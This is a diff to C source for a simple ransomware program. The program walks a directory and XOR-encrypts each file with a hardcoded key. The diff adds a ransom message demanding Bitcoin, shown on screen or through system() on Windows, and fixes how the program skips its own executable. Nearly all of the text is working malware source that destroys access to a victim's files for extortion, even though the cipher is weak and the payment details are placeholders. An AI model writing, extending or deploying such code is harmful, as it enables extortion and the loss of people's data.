@@ -1,4 +1,5 @@
 #include <dirent.h>
+#include <limits.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -9,6 +10,16 @@ void encryptDecrypt(unsigned char *input, const char *key) {
   for (size_t i = 0; input[i] != '\0'; ++i) {
     input[i] ^= key[i % strlen(key)]; // we XORing that thing with our key
   }
+}
+
+void showPopupMessage() {
+#ifdef _WIN32
+  system("cmd.exe /c echo Your files have been encrypted! To decrypt them, "
+         "send xxx BTC to xxx!");
+#else
+  printf("Your files have been encrypted! To decrypt them, send xxx BTC to "
+         "xxx!\n");
+#endif
 }
 
 int main(int argc, char *argv[]) {
@@ -23,8 +34,8 @@ int main(int argc, char *argv[]) {
   const char *masterKey = "simplekey";
 
   // get path of executable
-  const char *executableName =
-      argv[0]; // can do this in any other way but for now this is fine
+  char executablePath[PATH_MAX];
+  realpath(argv[0], executablePath);
 
   directoryPointer = opendir(directoryPath);
   if (directoryPointer == NULL) {
@@ -47,7 +58,7 @@ int main(int argc, char *argv[]) {
     sprintf(filePath, "%s/%s", directoryPath, entryPoint->d_name);
 
     // ignore main executable
-    if (strcmp(entryPoint->d_name, executableName) == 0) {
+    if (strcmp(filePath, executablePath) == 0) {
       printf("Skipping ransomware executable: %s\n", filePath);
       free(filePath);
       continue;
@@ -78,6 +89,8 @@ int main(int argc, char *argv[]) {
       continue;
     }
 
+    printf("Encrypting File: %s\n", filePath);
+
     // read the files and put it in the buffer
     fread(fileContent, 1, fileSize, filePointer);
     fileContent[fileSize] = '\0'; // null terminator
@@ -100,5 +113,9 @@ int main(int argc, char *argv[]) {
 
   // we done
   closedir(directoryPointer);
+
+  // Simple popup
+  showPopupMessage();
+
   return EXIT_SUCCESS;
 }
